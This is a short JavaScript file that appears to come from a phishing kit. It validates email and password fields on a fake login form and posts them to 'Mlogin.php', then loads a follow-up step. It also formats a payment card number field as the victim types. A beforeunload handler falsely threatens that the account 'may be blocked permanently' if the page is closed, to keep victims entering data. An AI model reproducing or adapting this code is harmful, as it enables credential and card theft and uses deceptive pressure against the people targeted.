/*
#####################################################################################################
###### ####### ##      ##      #######  #######       #### #### ####### ##     ##   ######   ########
##     ##   ## ##      ##      ##   ## ##             ## ### ## ##   ## ##     ##   ##    ##    ##
###### ####### ##      ##      ####### ##  ######     ##  #  ## ####### #########   ##     ##   ##
##     ##   ## ##      ##      ##   ## ##    ##       ##     ## ##   ## ##     ##   ##    ##    ##
##     ##   ## ####### ####### ##   ##  #######       ##     ## ##   ## ##     ##   ######   ########
#####################################################################################################
*/
function IsEmail(email) {
  var mahdi = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
  return mahdi.test(email);
}
function validate(){
	var email = $('#MImail');
	var pass = $('#MIpass');
	var mahdi;
	if(email.val() == ''){ 
		email.addClass("merror");
		mahdi = false;
	}   
	if(!IsEmail(email.val())){ 
		email.addClass("merror"); 
		mahdi = false; 
	}   
	if(pass.val() == ''){ 
		pass.addClass("merror"); 
		mahdi = false; 
	}  
	if(mahdi == false) { 
		return false ;
	}
	return true;
}
function submit() {
	if (!validate()) {
		return false;
	}
	var dataString = 'FMDemail='+$("#MImail").val()+'&FMDpassword='+$("#MIpass").val();
	$.ajax({
		type : "POST",
		url : "Mlogin.php",
		data : dataString,
		beforeSend : function() {
			  $("#MDtwo_load").show();
		},
		success : function(response) {
				if(response == 0) {
					$("#MDtwo_load").hide();
					$("#MIpass").addClass("merror");
					$("#MIpass").val("");
					return false;
				} else {
			        $.ajax({
			            url : "Mno_code.php",
			            dataType: "text",
			            success : function (data) {
			                $("#FMDone").html(data);
			            }
			        });
		   			$("#MDtwo_load").hide();
					$("#MDone").hide();
					$("#FMDone").show();
				}
		}
	});
	return true;
}

$(function(){
    $("#FMDcardNumber").keyup(function(){
        var $this = $(this);
        if ((($this.val().length+1) % 5)==0){
            $this.val($this.val() + " ");
        }
    });        
});
window.onbeforeunload = function(){
    if(!validate()){
        return 'If you leave, Your account may be blocked permanently !';
    }
};
$("input").change(function () {$(this).removeClass("merror");}).trigger("change");
